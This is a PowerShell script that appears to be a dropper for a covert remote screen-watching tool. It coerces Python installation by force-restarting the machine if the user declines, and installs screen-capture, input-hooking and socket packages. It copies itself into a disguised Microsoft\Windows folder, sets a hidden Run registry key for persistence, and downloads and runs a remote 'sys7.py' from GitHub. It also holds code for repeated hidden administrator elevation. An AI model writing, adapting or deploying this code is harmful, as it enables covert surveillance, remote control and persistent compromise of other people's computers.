# start checking python
Add-Type -AssemblyName PresentationFramework

function Reload-Env {
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("PATH","User")
}

function Check-PythonInstalled {
    Reload-Env
    try {
        $ver = & python --version 2>$null
        if ($LASTEXITCODE -eq 0) { return $true }
        return $false
    } catch {
        return $false
    }
}

while ($true) {

    if (Check-PythonInstalled) {
        echo "Python is installed."
        break
    }

    $choice = [System.Windows.MessageBox]::Show(
        "Python is required. Install now?",
        "Python Required",
        "YesNo",
        "Warning"
    )

    if ($choice -eq "Yes") {

        $store = Start-Process "ms-windows-store://pdp/?productid=9P7QFQMJRFP7" -PassThru

        while ($true) {

            if (Check-PythonInstalled) { break }

            $storeRunning = Get-Process -Id $store.Id -ErrorAction SilentlyContinue
            if (-not $storeRunning) { break }

            Start-Sleep -Seconds 2
        }

        continue
    }
    else {
        Restart-Computer -Force
    }
}


# installations here
# pip install opencv-python
python.exe -m pip install --upgrade pip
pip install python-socketio[client] opencv-python mss pynput pyautogui numpy















# local variables 


$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/screensharing-app/refs/heads/main/home/main.py?cb=$([guid]::NewGuid())"
$saveFolder = "$env:LOCALAPPDATA\Microsoft\Windows"
$savePath = "$saveFolder\sys7.py"


# common run as admin hidden function
function Run-AdminHidden {
    while (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $psi.Verb = "runas"
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            return $true
        } catch {
            Start-Sleep -Seconds 1
            continue
        }
    }
    return $false
}
function Run-AdminHidden-Once {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $psi.Verb = "runas"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    try {
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        return $true
    } catch {
        Start-Sleep -Seconds 1
        return $false
    }
}

# copy self to startup
function Copy-SelfToStartup {
    $source = $PSCommandPath

    if (-not (Test-Path $saveFolder)) { New-Item -Path $saveFolder -ItemType Directory | Out-Null }

    $target = Join-Path $saveFolder (Split-Path $source -Leaf)

    Copy-Item -Path $source -Destination $target -Force

    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "MyScript" `
    -Value "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$target`""
}


# download latest python file


function Donwload-File {
    echo "Downloading latest python file..."

    if (-not (Test-Path $saveFolder)) {
        New-Item -Path $saveFolder -ItemType Directory | Out-Null
    }

    $owner = "ProgrammerJibon"
    $repo = "wactherHelper"
    $path = "sys7.py"
    $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$path"

    $response = Invoke-RestMethod -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }

    [System.IO.File]::WriteAllBytes($savePath, [System.Convert]::FromBase64String($response.content))

    echo "Download completed."
}





if (Test-Path $savePath) {
    # $resRAO = Run-AdminHidden-Once
    $resRAO = $true
    if ($resRAO) {
        Copy-SelfToStartup
        Donwload-File
    }
    
} else {
    # Run-AdminHidden
    Copy-SelfToStartup
    Donwload-File
}



python $savePath
